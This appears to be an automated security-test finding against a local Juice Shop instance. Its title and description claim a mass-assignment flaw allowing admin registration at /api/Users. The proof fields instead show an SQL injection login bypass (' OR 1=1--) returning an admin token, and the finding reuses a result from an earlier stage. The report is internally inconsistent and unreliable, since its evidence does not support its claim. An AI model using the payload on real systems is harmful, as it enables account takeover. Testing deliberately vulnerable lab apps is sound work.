title: Mass Assignment - Admin Registration via API
description: The user creation endpoint at /api/Users is vulnerable to mass assignment. Including the "role":"admin" field in the POST body allows unauthenticated creation of admin-level accounts. This bypasses the intended privilege escalation controls.
poc: Probe request against POST http://127.0.0.1:3010/api/Users; observed proving result from prior stage handoff: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
